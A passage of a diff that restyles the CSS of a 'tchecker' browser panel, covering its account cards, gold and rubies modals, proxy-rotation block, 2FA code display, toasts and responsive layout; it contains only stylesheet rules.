-  cursor:pointer;font-family:inherit;
-}
-#tc-menu .tc-filter-btn.active{
-  background:var(--tc-accent-soft);color:var(--tc-text) !important;border-color:transparent;
-}
-#tc-menu .tc-filter-btn.danger.active{background:rgba(255,92,104,.12);color:var(--tc-danger) !important}
-
-#tc-menu .tc-search,
-#tc-menu .tc-setting-input,
-#tc-menu .tc-import-area,
-#tc-menu select.tc-setting-input,
-#tc-menu textarea{
-  width:100%;
-  border-radius:11px;
-  border:1px solid var(--tc-border);
-  background:var(--tc-surface) !important;
+  background:var(--tc-surface-2);
   color:var(--tc-text) !important;
-  font:13px/1.45 inherit;
-  outline:none;
+  border-color:var(--tc-border-2);
 }
-#tc-menu .tc-search,
-#tc-menu .tc-setting-input,
-#tc-menu select.tc-setting-input{height:40px;padding:0 12px;margin-bottom:10px}
-#tc-menu .tc-import-area,
-#tc-menu textarea{min-height:120px;padding:12px;resize:vertical}
-#tc-menu .tc-search:focus,
-#tc-menu .tc-setting-input:focus,
-#tc-menu .tc-import-area:focus,
-#tc-menu textarea:focus{
-  border-color:var(--tc-accent);
-  box-shadow:0 0 0 3px var(--tc-accent-soft);
+#tc-menu .tc-btn-secondary:hover{
+  background:var(--tc-surface-3);
+  border-color:rgba(208,214,224,.35);
 }
-#tc-menu .tc-search::placeholder,
-#tc-menu textarea::placeholder{color:var(--tc-text-dim) !important}
+#tc-menu .tc-btn-danger{
+  background:linear-gradient(180deg,#e85a63,#c43b44);
+  color:#fff !important;
+  border-color:rgba(255,255,255,.15);
+}
+#tc-menu .tc-btn-danger:hover{filter:brightness(1.08)}
 
-#tc-menu .tc-status-bar{
-  padding:10px 14px;margin-bottom:12px;border-radius:11px;
-  background:var(--tc-surface);border:1px solid var(--tc-border);
-  font-size:12px;color:var(--tc-text-muted) !important;
+/* ----- MODE / FILTERS ----- */
+#tc-menu .tc-mode-row{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
+#tc-menu .tc-mode-btn,
+#tc-menu .tc-filter-btn{
+  min-height:32px;padding:0 12px;
+  border-radius:6px;
+  background:var(--tc-surface);
+  border:1px solid var(--tc-border);
+  color:var(--tc-text-muted) !important;
+  font-size:11px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;
+  font-family:inherit;cursor:pointer;
+  transition:all .12s ease;
 }
-#tc-menu .tc-status-bar .hl{color:var(--tc-text) !important;font-weight:700}
+#tc-menu .tc-mode-btn:hover,
+#tc-menu .tc-filter-btn:hover{
+  color:var(--tc-text) !important;
+  border-color:var(--tc-border-2);
+}
+#tc-menu .tc-mode-btn.active,
+#tc-menu .tc-filter-btn.active{
+  background:rgba(208,214,224,.12);
+  border-color:rgba(208,214,224,.35);
+  color:var(--tc-text) !important;
+  box-shadow:inset 0 0 0 1px rgba(208,214,224,.08);
+}
+
+/* ----- FORMS ----- */
+#tc-menu .tc-setting-row{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+  margin-bottom:10px;
+}
+#tc-menu .tc-setting-label{font-size:12px;color:var(--tc-text-muted);font-weight:600}
+#tc-menu .tc-setting-input,
+#tc-menu .tc-search,
+#tc-menu textarea.tc-import-area,
+#tc-menu .tc-pr-textarea,
+#tc-menu select.tc-setting-input{
+  width:100%;
+  min-height:36px;
+  padding:8px 12px;
+  border-radius:6px;
+  background:var(--tc-surface) !important;
+  border:1px solid var(--tc-border) !important;
+  color:var(--tc-text) !important;
+  font-size:13px;font-family:inherit;
+  outline:none;
+  transition:border-color .12s ease,box-shadow .12s ease;
+}
+#tc-menu .tc-setting-input:focus,
+#tc-menu .tc-search:focus,
+#tc-menu textarea.tc-import-area:focus,
+#tc-menu .tc-pr-textarea:focus{
+  border-color:rgba(208,214,224,.45) !important;
+  box-shadow:0 0 0 2px rgba(208,214,224,.12) !important;
+}
+#tc-menu .tc-search{margin-bottom:10px}
+#tc-menu textarea.tc-import-area,
+#tc-menu .tc-pr-textarea{
+  min-height:110px;resize:vertical;
+  font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12px;line-height:1.5;
+}
+#tc-menu .tc-setting-row .tc-setting-input{width:180px;flex:0 0 auto}
 
 #tc-menu .tc-switch{
   display:flex;align-items:center;justify-content:space-between;gap:12px;
-  padding:12px 14px;margin-bottom:8px;
-  border-radius:12px;background:var(--tc-surface);border:1px solid var(--tc-border);
-  cursor:pointer;color:var(--tc-text) !important;
+  font-size:12px;color:var(--tc-text-muted);font-weight:600;
+  cursor:pointer;
 }
-#tc-menu .tc-switch span{color:var(--tc-text) !important;font-size:13px;font-weight:600}
 #tc-menu .tc-switch input{display:none}
 #tc-menu .tc-switch-track{
-  width:40px;height:22px;border-radius:99px;background:var(--tc-surface-3);
-  position:relative;border:1px solid var(--tc-border);flex-shrink:0;
+  width:40px;height:22px;border-radius:11px;
+  background:var(--tc-surface-3);
+  border:1px solid var(--tc-border);
+  position:relative;flex-shrink:0;
+  transition:background .15s ease;
 }
 #tc-menu .tc-switch-track::after{
-  content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;
-  background:var(--tc-text-muted);transition:transform .18s ease,background .18s ease;
+  content:"";
+  position:absolute;top:2px;left:2px;
+  width:16px;height:16px;border-radius:50%;
+  background:#c8cfdc;
+  box-shadow:0 1px 3px rgba(0,0,0,.35);
+  transition:transform .15s ease;
 }
-#tc-menu .tc-switch input:checked + .tc-switch-track{background:var(--tc-accent);border-color:transparent}
-#tc-menu .tc-switch input:checked + .tc-switch-track::after{transform:translateX(18px);background:#fff}
-
-#tc-menu .tc-setting-row{
-  display:flex;align-items:center;justify-content:space-between;gap:12px;
-  padding:10px 0;border-bottom:1px solid var(--tc-border);
+#tc-menu .tc-switch input:checked + .tc-switch-track{
+  background:linear-gradient(90deg,#9aa5b8,#d0d6e0);
+  border-color:rgba(255,255,255,.2);
 }
-#tc-menu .tc-setting-label{font-size:13px;font-weight:600;color:var(--tc-text) !important}
-#tc-menu .tc-setting-row .tc-setting-input{width:220px;margin:0}
+#tc-menu .tc-switch input:checked + .tc-switch-track::after{
+  transform:translateX(18px);
+  background:#0a0c10;
+}
 
 #tc-menu .tc-dropzone{
-  padding:28px;text-align:center;border-radius:14px;
-  border:1px dashed var(--tc-border-2);background:var(--tc-surface);
-  color:var(--tc-text-muted) !important;
-}
-#tc-menu .tc-dropzone.dragging{border-color:var(--tc-accent);background:var(--tc-accent-soft)}
-#tc-menu .tc-dropzone h3{margin:0 0 6px;color:var(--tc-text) !important;font-size:15px}
-#tc-menu .tc-dropzone p,#tc-menu .tc-dropzone small{color:var(--tc-text-dim) !important}
-
-#tc-menu .tc-account-list{max-height:360px;overflow:auto}
-
-/* prem cards */
-#tc-menu .tc-prem-card{flex-direction:column;align-items:stretch;gap:10px}
-#tc-menu .tc-prem-top{display:flex;justify-content:space-between;gap:10px;align-items:flex-start}
-#tc-menu .tc-prem-row{display:flex;gap:14px;font-size:12px;color:var(--tc-text-muted) !important}
-#tc-menu .tc-prem-row .val{font-weight:700;color:var(--tc-text) !important;margin-left:4px}
-#tc-menu .tc-prem-foot{display:flex;justify-content:space-between;font-size:11px;color:var(--tc-text-dim) !important}
-#tc-menu .tc-prem-progress{height:4px;border-radius:99px;background:var(--tc-surface-3);overflow:hidden;margin-top:4px}
-#tc-menu .tc-prem-progress-bar{height:100%;background:var(--tc-accent);border-radius:99px}
-#tc-menu .tc-prem-login .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--tc-success);margin-right:7px}
-#tc-menu .tc-prem-login .dot.warn{background:var(--tc-warning)}
-#tc-menu .tc-prem-login .dot.err{background:var(--tc-danger)}
-
-#tc-menu .tc-selected-info{font-size:12px;color:var(--tc-text-muted) !important;margin-bottom:10px}
-#tc-menu .tc-select-panel{display:none;max-height:180px;overflow:auto;padding:8px;border:1px solid var(--tc-border);border-radius:12px;background:var(--tc-surface);margin-bottom:10px}
-#tc-menu .tc-select-panel.show{display:block}
-#tc-menu .tc-select-item{display:flex;align-items:center;gap:8px;padding:6px 8px;font-size:12px;color:var(--tc-text) !important;cursor:pointer}
-
-/* ===== DETAIL + ASSETS + GOLD MODALS ===== */
-#tc-detail-modal,
-#tc-assets-modal,
-#tc-gold-modal{
-  position:fixed;inset:0;z-index:100001;display:none;align-items:center;justify-content:center;
-  background:rgba(0,0,0,.7);backdrop-filter:blur(10px);
-  color:var(--tc-text) !important;
-}
-#tc-detail-modal.show{display:flex}
-#tc-detail-modal .tc-detail-content,
-#tc-assets-modal .tc-detail-content,
-#tc-gold-modal .tc-detail-content{
-  width:min(560px,calc(100vw - 32px));max-height:min(80vh,720px);overflow:auto;
-  background:var(--tc-bg-2) !important;border:1px solid var(--tc-border);border-radius:18px;
-  padding:18px 18px 16px;color:var(--tc-text) !important;box-shadow:var(--tc-shadow);
-}
-#tc-detail-modal .tc-detail-header,
-#tc-assets-modal .tc-detail-header,
-#tc-gold-modal .tc-detail-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:12px}
-#tc-detail-modal .tc-detail-title,
-#tc-assets-modal .tc-detail-title,
-#tc-gold-modal .tc-detail-title{font-size:16px;font-weight:800;color:var(--tc-text) !important}
-#tc-detail-modal .tc-detail-close,
-#tc-assets-modal .tc-detail-close,
-#tc-gold-modal .tc-detail-close{
-  width:32px;height:32px;border-radius:9px;border:1px solid var(--tc-border);
-  background:var(--tc-surface) !important;color:var(--tc-text-muted) !important;cursor:pointer;
-  font-size:14px;line-height:1;
-}
-#tc-detail-modal .tc-detail-row{
-  display:flex;justify-content:space-between;gap:12px;padding:8px 0;
-  border-bottom:1px solid var(--tc-border);font-size:13px;
-}
-#tc-detail-modal .tc-detail-label{color:var(--tc-text-muted) !important}
-#tc-detail-modal .tc-detail-value{color:var(--tc-text) !important;font-weight:600;text-align:right;word-break:break-all}
-#tc-detail-modal .tc-detail-actions{display:flex;gap:8px;margin-top:14px}
-
-/* Shared cards outside #tc-menu (assets / gold modal lists) */
-#tc-assets-modal .tc-account-card,
-#tc-gold-modal .tc-account-card,
-#tc-detail-modal .tc-account-card{
-  display:flex;align-items:center;justify-content:space-between;gap:12px;
-  padding:12px 14px;margin-bottom:8px;
-  border-radius:12px;
-  background:var(--tc-surface) !important;
-  border:1px solid var(--tc-border);
-  color:var(--tc-text) !important;
-  cursor:pointer;
+  border:1px dashed rgba(208,214,224,.28);
+  border-radius:8px;
+  padding:28px 20px;
+  text-align:center;
+  background:var(--tc-surface);
   transition:border-color .15s ease,background .15s ease;
 }
-#tc-assets-modal .tc-account-card:hover,
-#tc-gold-modal .tc-account-card:hover,
-#tc-detail-modal .tc-account-card:hover{
-  border-color:var(--tc-border-2);background:var(--tc-surface-2) !important;
+#tc-menu .tc-dropzone:hover,
+#tc-menu .tc-dropzone.dragging{
+  border-color:rgba(208,214,224,.55);
+  background:rgba(208,214,224,.04);
 }
-#tc-assets-modal .tc-account-card .login,
-#tc-gold-modal .tc-account-card .login,
-#tc-detail-modal .tc-account-card .login{
-  font-size:13px;font-weight:700;color:var(--tc-text) !important;
-}
-#tc-assets-modal .tc-account-card .details,
-#tc-gold-modal .tc-account-card .details,
-#tc-detail-modal .tc-account-card .details{
-  display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;
-}
-#tc-assets-modal .tag,
-#tc-gold-modal .tag,
-#tc-detail-modal .tag{
-  display:inline-flex;align-items:center;
-  padding:2px 8px;border-radius:999px;
-  background:var(--tc-surface-3) !important;
-  border:1px solid var(--tc-border);
-  font-size:10px;font-weight:600;
-  color:var(--tc-text-muted) !important;
-}
-#tc-assets-modal .tc-empty,
-#tc-gold-modal .tc-empty,
-#tc-detail-modal .tc-empty{
-  padding:28px 20px;text-align:center;
-  border:1px dashed var(--tc-border-2);border-radius:14px;
-  color:var(--tc-text-muted) !important;
-}
-#tc-assets-modal .tc-empty h4,
-#tc-gold-modal .tc-empty h4,
-#tc-detail-modal .tc-empty h4{margin:0 0 6px;color:var(--tc-text) !important;font-size:14px}
-#tc-assets-modal .tc-empty p,
-#tc-gold-modal .tc-empty p,
-#tc-detail-modal .tc-empty p{margin:0;font-size:12px;color:var(--tc-text-dim) !important}
-#tc-assets-modal #assets-modal-list,
-#tc-gold-modal #gold-modal-list{overflow-y:auto;flex:1;padding:4px 0;min-height:120px}
+#tc-menu .tc-dropzone h3{margin:0 0 6px;font-size:14px;color:var(--tc-text)}
+#tc-menu .tc-dropzone p{margin:0 0 12px;font-size:12px;color:var(--tc-text-muted)}
+#tc-menu .tc-dropzone small{display:block;margin-top:10px;font-size:10px;color:var(--tc-text-dim)}
 
-/* ===== RUBIES ADD MODAL ===== */
-#tc-rubies-add-modal{
-  position:fixed;inset:0;z-index:100005;display:flex;align-items:center;justify-content:center;
-  padding:20px;background:rgba(0,0,0,.72);backdrop-filter:blur(12px);
-  opacity:0;visibility:hidden;pointer-events:none;transition:opacity .2s ease,visibility .2s;
+#tc-menu .tc-empty{
+  text-align:center;padding:32px 16px;
+  color:var(--tc-text-dim);
 }
-#tc-rubies-add-modal.open{opacity:1;visibility:visible;pointer-events:auto}
-#tc-rubies-add-modal .tc-rubies-add-card{
-  width:min(680px,calc(100vw - 32px));max-height:min(760px,calc(100vh - 32px));overflow:auto;
-  background:var(--tc-bg-2);border:1px solid var(--tc-border);border-radius:18px;
-  box-shadow:var(--tc-shadow);color:var(--tc-text) !important;padding:18px;
-}
-#tc-rubies-add-modal .tc-rubies-add-head{display:flex;justify-content:space-between;gap:12px;margin-bottom:12px}
-#tc-rubies-add-modal .tc-rubies-add-kicker{font-size:10px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--tc-text-dim) !important}
-#tc-rubies-add-modal .tc-rubies-add-title{font-size:20px;font-weight:800;color:var(--tc-text) !important}
-#tc-rubies-add-modal .tc-rubies-add-sub{font-size:12px;color:var(--tc-text-muted) !important;margin-top:4px;line-height:1.45}
-#tc-rubies-add-modal .tc-rubies-add-close{
-  width:34px;height:34px;border-radius:10px;border:1px solid var(--tc-border);
-  background:var(--tc-surface);color:var(--tc-text-muted) !important;cursor:pointer;
-}
-#tc-rubies-add-modal .tc-rubies-add-label{display:block;font-size:10px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--tc-text-dim) !important;margin-bottom:8px}
-#tc-rubies-add-modal #rubies-add-textarea{
-  width:100%;min-height:200px;padding:12px;border-radius:12px;
-  border:1px solid var(--tc-border);background:var(--tc-surface) !important;color:var(--tc-text) !important;
-  font:13px/1.5 ui-monospace,Consolas,monospace;resize:vertical;
-}
-#tc-rubies-add-modal .tc-rubies-add-format{
-  margin-top:10px;padding:12px;border-radius:12px;border:1px solid var(--tc-border);
-  background:var(--tc-surface);font-size:11px;color:var(--tc-text-muted) !important;line-height:1.55;
-}
-#tc-rubies-add-modal .tc-rubies-add-format code{color:var(--tc-text) !important}
-#tc-rubies-add-modal .tc-rubies-add-preview{
-  margin-top:12px;padding:10px 12px;border-radius:10px;background:var(--tc-accent-soft);
-  display:flex;justify-content:space-between;color:var(--tc-text) !important;font-size:12px;
-}
-#tc-rubies-add-modal .tc-rubies-add-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:14px}
+#tc-menu .tc-empty h4{margin:0 0 6px;font-size:14px;color:var(--tc-text-muted)}
+#tc-menu .tc-empty p{margin:0;font-size:12px}
 
-/* ===== TOASTS ===== */
-.tc-toast-stack{position:fixed;right:18px;bottom:18px;z-index:100010;display:flex;flex-direction:column;gap:8px;pointer-events:none}
-.tc-toast{
-  pointer-events:auto;min-width:260px;max-width:360px;
-  display:flex;gap:10px;align-items:flex-start;
-  padding:12px 14px;border-radius:12px;
-  background:var(--tc-bg-2);border:1px solid var(--tc-border);
-  box-shadow:var(--tc-shadow);color:var(--tc-text) !important;
-  opacity:0;transform:translateY(8px);transition:all .2s ease;
+#tc-menu .tc-selected-info{
+  font-size:11px;color:var(--tc-text-dim);margin:6px 0 10px;
 }
-.tc-toast.show{opacity:1;transform:translateY(0)}
-.tc-toast-title{font-size:12px;font-weight:800;color:var(--tc-text) !important}
-.tc-toast-msg{font-size:12px;color:var(--tc-text-muted) !important;margin-top:2px}
-.tc-toast.success{border-color:rgba(62,207,142,.35)}
-.tc-toast.error{border-color:rgba(255,92,104,.35)}
-.tc-toast.warning{border-color:rgba(240,180,41,.35)}
-
-/* ===== PROXY BLOCK (settings) ===== */
-#tc-menu #proxy-rotation-settings{
-  margin-top:22px;padding:14px;border:1px solid var(--tc-border);border-radius:14px;
+#tc-menu .tc-select-panel{
+  display:none;flex-wrap:wrap;gap:6px;
+  padding:10px;margin-bottom:10px;
+  border:1px solid var(--tc-border);border-radius:8px;
   background:var(--tc-surface);
 }
-#tc-menu .tc-pr-title{font-size:12px;font-weight:800;letter-spacing:.08em;color:var(--tc-text) !important}
-#tc-menu .tc-pr-label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--tc-text-dim) !important}
-#tc-menu .tc-pr-value,#tc-menu .tc-pr-time{color:var(--tc-text) !important}
-#tc-menu .tc-pr-help{color:var(--tc-text-muted) !important}
-#tc-menu .tc-pr-textarea{
-  width:100%;min-height:100px;padding:10px;border-radius:10px;
-  border:1px solid var(--tc-border);background:var(--tc-bg) !important;color:var(--tc-text) !important;
-  font:12px/1.45 ui-monospace,Consolas,monospace;
+#tc-menu .tc-select-panel.show{display:flex}
+#tc-menu .tc-select-item{
+  display:flex;align-items:center;gap:6px;
+  font-size:12px;color:var(--tc-text-muted);cursor:pointer;
+  padding:4px 8px;border-radius:4px;
+  background:rgba(208,214,224,.04);
+  border:1px solid transparent;
+}
+#tc-menu .tc-select-item:hover{border-color:var(--tc-border);color:var(--tc-text)}
+
+/* status bar */
+#tc-menu #tc-status-bar,
+#tc-menu .tc-status-bar{
+  font-size:11px;color:var(--tc-text-muted);
+  padding:8px 0;margin-bottom:8px;
+}
+#tc-menu #tc-status-bar .hl{color:var(--tc-accent-strong);font-weight:700}
+
+/* ----- DETAIL MODAL ----- */
+#tc-detail-modal,
+#tc-assets-modal,
+#tc-gold-modal,
+#tc-rubies-add-modal{
+  position:fixed;inset:0;z-index:100000;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(4,6,10,.7);
+  backdrop-filter:blur(10px);
+  opacity:0;visibility:hidden;pointer-events:none;
+  transition:opacity .2s ease,visibility .2s ease;
+}
+#tc-detail-modal.show,
+#tc-detail-modal.open,
+#tc-assets-modal.show,
+#tc-assets-modal.open,
+#tc-gold-modal.show,
+#tc-gold-modal.open,
+#tc-rubies-add-modal.open,
+#tc-rubies-add-modal.show{
+  opacity:1;visibility:visible;pointer-events:auto;
+}
+#tc-detail-modal .tc-detail-content,
+#tc-rubies-add-modal .tc-rubies-add-card,
+#tc-assets-modal .tc-modal-panel,
+#tc-assets-modal .tc-detail-content,
+#tc-gold-modal .tc-modal-panel,
+#tc-gold-modal .tc-detail-content{
+  width:min(520px,calc(100vw - 24px));
+  max-height:min(80vh,640px);
+  overflow:auto;
+  background:linear-gradient(165deg,#141821,#0e1118);
+  border:1px solid rgba(208,214,224,.2);
+  border-radius:10px;
+  box-shadow:0 24px 64px rgba(0,0,0,.65),0 0 0 1px rgba(208,214,224,.06);
+  padding:0;
+  color:var(--tc-text,#eef1f6);
+}
+#tc-assets-modal .tc-detail-header,
+#tc-gold-modal .tc-detail-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 16px;
+  border-bottom:1px solid rgba(208,214,224,.12);
+}
+#tc-assets-modal .tc-detail-title,
+#tc-gold-modal .tc-detail-title{
+  font-size:13px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;
+  color:var(--tc-text,#eef1f6);
+}
+#tc-assets-modal .tc-detail-close,
+#tc-gold-modal .tc-detail-close{
+  width:28px;height:28px;border-radius:6px;
+  border:1px solid rgba(208,214,224,.15);
+  background:rgba(208,214,224,.06);
+  color:var(--tc-text-muted,#9aa3b2);cursor:pointer;font-size:14px;
+}
+#tc-assets-modal #assets-modal-list,
+#tc-gold-modal #gold-modal-list{
+  padding:10px 14px 14px;
+}
+#tc-assets-modal .tc-account-card .login,
+#tc-gold-modal .tc-account-card .login{
+  font-size:13px;font-weight:700;color:var(--tc-text,#eef1f6);
+}
+#tc-assets-modal .tc-account-card .details,
+#tc-gold-modal .tc-account-card .details{
+  display:flex;flex-wrap:wrap;gap:4px;margin-top:4px;
+}
+#tc-assets-modal .tag,
+#tc-gold-modal .tag{
+  display:inline-flex;padding:2px 7px;border-radius:4px;
+  font-size:10px;font-weight:650;
+  background:rgba(208,214,224,.08);
+  border:1px solid rgba(208,214,224,.12);
+  color:var(--tc-text-muted,#9aa3b2);
+}
+#tc-detail-modal .tc-detail-header,
+#tc-rubies-add-modal .tc-rubies-add-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 16px;
+  border-bottom:1px solid rgba(208,214,224,.12);
+}
+#tc-detail-modal .tc-detail-title{font-size:13px;font-weight:800;letter-spacing:.06em;text-transform:uppercase}
+#tc-detail-modal .tc-detail-close,
+#tc-rubies-add-modal .tc-rubies-add-close{
+  width:28px;height:28px;border-radius:6px;
+  border:1px solid rgba(208,214,224,.15);
+  background:rgba(208,214,224,.06);
+  color:var(--tc-text-muted);cursor:pointer;
+  font-size:14px;
+}
+#tc-detail-modal #detail-rows{padding:12px 16px}
+#tc-detail-modal .tc-detail-row{
+  display:flex;justify-content:space-between;gap:12px;
+  padding:8px 0;
+  border-bottom:1px solid rgba(208,214,224,.06);
+  font-size:12px;
+}
+#tc-detail-modal .tc-detail-label{color:var(--tc-text-dim);font-weight:600}
+#tc-detail-modal .tc-detail-value{color:var(--tc-text);font-weight:650;text-align:right;word-break:break-all}
+#tc-detail-modal .tc-detail-actions{
+  display:flex;gap:8px;padding:12px 16px 16px;
+}
+#tc-detail-modal .tc-detail-actions .tc-btn{flex:1}
+
+#tc-rubies-add-modal .tc-rubies-add-card{width:min(520px,calc(100vw - 24px));padding:16px}
+#tc-rubies-add-modal textarea{
+  width:100%;min-height:140px;margin:10px 0;
+  border-radius:6px;padding:10px;
+  background:var(--tc-surface);border:1px solid var(--tc-border);
+  color:var(--tc-text);font:12px/1.45 ui-monospace,Consolas,monospace;
+  resize:vertical;
 }
 
-/* ===== RESPONSIVE ===== */
-@media(max-width:900px){
+/* ----- TOASTS ----- */
+.tc-toast-stack{
+  position:fixed;right:16px;bottom:16px;z-index:100001;
+  display:flex;flex-direction:column;gap:8px;
+  pointer-events:none;
+}
+.tc-toast{
+  pointer-events:auto;
+  display:flex;align-items:flex-start;gap:10px;
+  min-width:260px;max-width:340px;
+  padding:12px 14px;
+  border-radius:8px;
+  background:linear-gradient(160deg,#161b24,#10141c);
+  border:1px solid rgba(208,214,224,.18);
+  box-shadow:0 12px 32px rgba(0,0,0,.5);
+  opacity:0;transform:translateY(8px);
+  transition:opacity .2s ease,transform .2s ease;
+  position:relative;overflow:hidden;
+}
+.tc-toast.show{opacity:1;transform:translateY(0)}
+.tc-toast-icon{flex-shrink:0;margin-top:1px;opacity:.9}
+.tc-toast-title{font-size:11px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:var(--tc-text)}
+.tc-toast-msg{font-size:12px;color:var(--tc-text-muted);margin-top:2px;line-height:1.35}
+.tc-toast-progress{
+  position:absolute;left:0;bottom:0;height:2px;width:100%;
+  background:linear-gradient(90deg,#9aa5b8,#d0d6e0);
+  transform-origin:left;
+  animation:tcToastProg 3s linear forwards;
+}
+@keyframes tcToastProg{from{transform:scaleX(1)}to{transform:scaleX(0)}}
+.tc-toast.success .tc-toast-progress{background:var(--tc-success)}
+.tc-toast.error .tc-toast-progress{background:var(--tc-danger)}
+.tc-toast.warning .tc-toast-progress{background:var(--tc-warning)}
+
+/* ----- PROXY BLOCK ----- */
+#proxy-rotation-settings{
+  margin-top:22px;padding:14px;
+  border:1px solid var(--tc-border);
+  border-radius:8px;
+  background:var(--tc-surface);
+}
+.tc-pr-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px}
+.tc-pr-title{font-size:11px;font-weight:800;letter-spacing:.12em;color:var(--tc-text);text-transform:uppercase}
+.tc-pr-status{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:800;letter-spacing:.08em;color:var(--tc-text-muted)}
+.tc-pr-dot{width:7px;height:7px;border-radius:50%;background:#777}
+.tc-pr-dot.active{background:var(--tc-success);box-shadow:0 0 8px rgba(79,214,160,.4)}
+.tc-pr-dot.error{background:var(--tc-danger);box-shadow:0 0 8px rgba(240,113,120,.4)}
+.tc-pr-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.tc-pr-card{padding:10px;border:1px solid var(--tc-border);border-radius:6px;background:var(--tc-bg)}
+.tc-pr-label{font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--tc-text-dim);margin-bottom:4px}
+.tc-pr-value{font-size:12px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.tc-pr-time{font-size:18px;font-variant-numeric:tabular-nums;font-weight:800}
+.tc-pr-editor{margin-top:10px}
+.tc-pr-textarea{
+  box-sizing:border-box;width:100%;min-height:100px;resize:vertical;
+  padding:10px;border:1px solid var(--tc-border);border-radius:6px;
+  background:var(--tc-bg);color:var(--tc-text);
+  font:12px/1.5 ui-monospace,Consolas,monospace;outline:none;
+}
+.tc-pr-textarea:focus{border-color:rgba(208,214,224,.4);box-shadow:0 0 0 2px rgba(208,214,224,.1)}
+.tc-pr-help{margin-top:6px;font-size:10px;line-height:1.4;color:var(--tc-text-muted)}
+.tc-pr-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
+.tc-pr-actions .tc-btn{margin:0}
+.tc-pr-wide{grid-column:1/-1}
+.tc-pr-auto{display:flex;align-items:center;justify-content:space-between;width:100%}
+.tc-pr-error{grid-column:1/-1;min-height:16px;font-size:11px;line-height:1.45;color:#f07178;word-break:break-word}
+
+/* ----- 2FA tab bits ----- */
+#tab-twofa .twofa-list{display:flex;flex-direction:column;gap:8px;margin-top:10px;max-height:480px;overflow-y:auto}
+#tab-twofa .twofa-card{
+  display:grid;grid-template-columns:minmax(100px,1fr) minmax(150px,190px) auto;
+  align-items:center;gap:12px;
+  padding:12px 14px;
+  border:1px solid var(--tc-border);border-radius:8px;
+  background:var(--tc-surface);
+}
+#tab-twofa .twofa-card-name{font-size:13px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#tab-twofa .twofa-otp-box{
+  display:flex;flex-direction:column;align-items:center;
+  padding:8px;border-radius:6px;
+  background:var(--tc-bg);border:1px solid var(--tc-border);
+}
+#tab-twofa .twofa-otp-label{font-size:8px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--tc-text-dim);margin-bottom:3px}
+#tab-twofa .twofa-otp-code{
+  font-size:22px;font-weight:800;font-variant-numeric:tabular-nums;
+  font-family:ui-monospace,Consolas,monospace;letter-spacing:.14em;
+  color:var(--tc-text);cursor:pointer;
+}
+#tab-twofa .twofa-otp-timer{font-size:10px;margin-top:3px;color:var(--tc-text-muted)}
+#tab-twofa .twofa-otp-bar{width:100%;height:2px;margin-top:6px;border-radius:1px;background:rgba(255,255,255,.06);overflow:hidden}
+#tab-twofa .twofa-otp-bar > div{height:100%;background:#d0d6e0;transition:width .2s linear}
+#tab-twofa .twofa-card-actions{display:flex;gap:6px;justify-content:flex-end}
+#tab-twofa .twofa-import-box{
+  margin-top:8px;padding:12px;
+  border:1px solid var(--tc-border);border-radius:8px;background:var(--tc-surface);
+}
+
+/* ----- RESPONSIVE ----- */
+@media (max-width:900px){
   #tc-panel{grid-template-columns:72px minmax(0,1fr)}
   #tc-menu .tc-brand-text,#tc-menu .tc-nav-label,#tc-menu .tc-tab span,#tc-menu .tc-sidebar-footer{display:none}
-  #tc-menu .tc-tabs{padding:16px 8px}
+  #tc-menu .tc-tabs{padding:12px 6px}
   #tc-menu .tc-tab{justify-content:center;padding:0}
+  #tc-menu .tc-brand{justify-content:center;padding:6px 0 12px}
 }
-@media(max-width:650px){
-  #tc-panel{
-    grid-template-columns:1fr;
-    grid-template-rows:64px 58px minmax(0,1fr);
-    grid-template-areas:"header" "sidebar" "content";
-    border-radius:16px;
-  }
-  #tc-menu .tc-tabs{
-    flex-direction:row;padding:8px;overflow-x:auto;
-    border-right:0;border-bottom:1px solid var(--tc-border);
-  }
+@media (max-width:650px){
+  #tc-menu{width:calc(100vw - 8px);height:calc(100vh - 8px)}
+  #tc-panel{grid-template-columns:1fr;grid-template-rows:auto 52px minmax(0,1fr);grid-template-areas:"header" "sidebar" "content";border-radius:8px}
+  #tc-menu .tc-tabs{flex-direction:row;overflow:auto;border-right:0;border-bottom:1px solid var(--tc-border);padding:6px}
   #tc-menu .tc-brand,#tc-menu .tc-nav-label,#tc-menu .tc-sidebar-footer{display:none}
-  #tc-menu .tc-tab{min-width:88px;justify-content:center}
-  #tc-menu .tc-tab span{display:block;font-size:11px}
-  #tc-menu .tc-header{padding:0 12px}
-  #tc-menu .tc-chip{display:none}
-  #tc-menu .tc-tab-content{padding:16px}
+  #tc-menu .tc-nav{flex-direction:row;gap:4px}
+  #tc-menu .tc-tab{min-width:40px}
+  .tc-pr-grid,.tc-pr-actions{grid-template-columns:1fr}
+  #tab-twofa .twofa-card{grid-template-columns:1fr}
 }
-        `;
+
+
+/* =========================================================
+   GLOBAL SCOPE FIX — styles outside #tc-menu + missing comps
+   ========================================================= */
+#tc-detail-modal.tchecker-ui,
+#tc-rubies-add-modal.tchecker-ui,
+#tc-assets-modal.tchecker-ui,
+#tc-gold-modal.tchecker-ui,
+.tc-toast-stack.tchecker-ui{
+  color:var(--tc-text);
+}
+
+/* Buttons / cards / inputs work in modals too */
+#tc-menu .tc-btn,
